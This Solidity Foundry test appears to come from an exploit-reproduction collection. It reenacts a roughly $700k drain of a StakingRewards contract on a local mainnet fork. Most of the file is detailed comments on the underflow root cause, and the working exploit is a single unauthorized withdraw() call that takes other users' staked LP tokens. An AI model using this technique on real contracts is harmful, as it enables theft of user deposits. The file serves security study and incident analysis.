// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : 700k
// Attacker : 0x1751e3e1aaf1a3e7b973c889b7531f43fc59f7d0
// AttackContract : 0x89767960b76b009416bc7ff4a4b79051eed0a9ee
// StakingRewards contract: 0xB3FB1D01B07A706736Ca175f827e4F56021b85dE
// Attack TX: https://etherscan.io/tx/0x33479bcfbc792aa0f8103ab0d7a3784788b5b0e1467c81ffbed1b7682660b4fa
// Attack TX: https://bscscan.com/tx/0x784b68dc7d06ee181f3127d5eb5331850b5e690cc63dd099cd7b8dc863204bf6

interface IStakingRewards {
    function withdraw(
        uint256 amount
    ) external;
}

// VULNERABILITY: Unauthorized underflow-enabled withdrawal of staked tokens (no balance check + unchecked arithmetic)
// 
// Root cause in StakingRewards._withdraw (pragma solidity 0.7.5, sources/.../contracts_staking_StakingRewards.sol:258):
//   function _withdraw(uint256 amount, address user, address recipient) internal nonReentrant updateReward(user) {
//       require(amount != 0, "Cannot withdraw 0");
//       // not using safe math, because there is no way to overflow if stake tokens not overflow
//       _totalSupply = _totalSupply - amount;
//       _balances[user] = _balances[user] - amount;
//       require(stakingToken.transfer(recipient, amount), "token transfer failed");
//       ...
//   }
// 
// - Public withdraw() (line 201) calls _withdraw(amount, msg.sender, msg.sender) with NO check that amount <= _balances[user].
// - _stake() (lines 241-243) only does require(amount != 0) then direct += on _totalSupply/_balances.
// - In Solidity <0.8 (here 0.7.5), uint256 - underflows by wrapping (mod 2^256). No SafeMath.sub used for accounting (contrast SafeERC20 used for token xfers).
// - The transfer uses the *caller-supplied* `amount`, not the post-underflow balance or min(amount, userStake).
// - updateReward modifier (lines 64-71) runs first but for a zero-balance attacker, earned()=0 so no reward side-effect blocks it.
// 
// Why it works: Attacker (zero prior stake) supplies amount == (or <=) contract's current stakingToken.balanceOf(this) (UniLP held from legit stakers).
// Underflow makes _balances[attacker] and _totalSupply wrap to huge values, require(transfer) succeeds because pool actually holds the LP, attacker receives real tokens.
// 
// Impact: Complete drain of the StakingRewards contract's UniLP holdings (user deposits) in a single call, no capital required. ~8792.87 UniLP tokens stolen (~700k USD). Pool accounting left corrupted (huge _totalSupply, huge attacker "balance").
// 
// The incorrect assumption was "users will only ever withdraw what they staked, and stake tokens can't underflow". Missing authorization/balance invariant + deliberate avoidance of SafeMath.

contract AttackContract is Test {
    CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IStakingRewards constant StakingRewards = IStakingRewards(0xB3FB1D01B07A706736Ca175f827e4F56021b85dE);
    IERC20 constant uniLP = IERC20(0xB1BbeEa2dA2905E6B0A30203aEf55c399C53D042);

    function setUp() public {
        cheat.createSelectFork("http://127.0.0.1:8545", 14_421_983); // Fork mainnet at block 14421983
    }

    function testExploit() public {
        emit log_named_decimal_uint("Before exploiting, Attacker UniLP Balance", uniLP.balanceOf(address(this)), 18);

        // EXPLOIT STEPS:
        // 1. Attacker deploys/uses AttackContract with zero initial stake in StakingRewards (no prior stake() call, _balances[attacker]=0).
        // 2. At fork block 14421983, StakingRewards holds ~8792.87 UniLP (stakingToken) from other users' deposits.
        // 3. Call StakingRewards.withdraw(DRAIN_AMOUNT) where DRAIN_AMOUNT=8792873290680252648282 is chosen to equal the pool's held LP balance (sufficient to drain).
        // 4. In _withdraw: require(amount!=0) passes; updateReward sees 0 balance so no reward accrual; _totalSupply -= amount and _balances[msg.sender] -= amount UNDERFLOW (wrap to ~2^256 - amount).
        // 5. stakingToken.transfer(attacker, DRAIN_AMOUNT) executes successfully (contract has the tokens) and emits Withdrawn.
        // 6. Attacker now holds the drained UniLP tokens (can be burned/redeemed on Uniswap for underlying assets). No funds were ever deposited by attacker.
        // 
        // The single call both bypasses the stake requirement and extracts value due to the missing check + arithmetic wrap.
        StakingRewards.withdraw(8_792_873_290_680_252_648_282); //without putting any crypto, we can drain out the LP tokens in uniswap pool by underflow.

        /*
        StakingRewards contract, vulnerable code snippet.
    function _withdraw(uint256 amount, address user, address recipient) internal nonReentrant updateReward(user) {
        require(amount != 0, "Cannot withdraw 0");

        // not using safe math, because there is no way to overflow if stake tokens not overflow
        _totalSupply = _totalSupply - amount;
        _balances[user] = _balances[user] - amount;   //<---- underflow here.
        */
        emit log_named_decimal_uint("After exploiting, Attacker UniLP Balance", uniLP.balanceOf(address(this)), 18);
    }
}
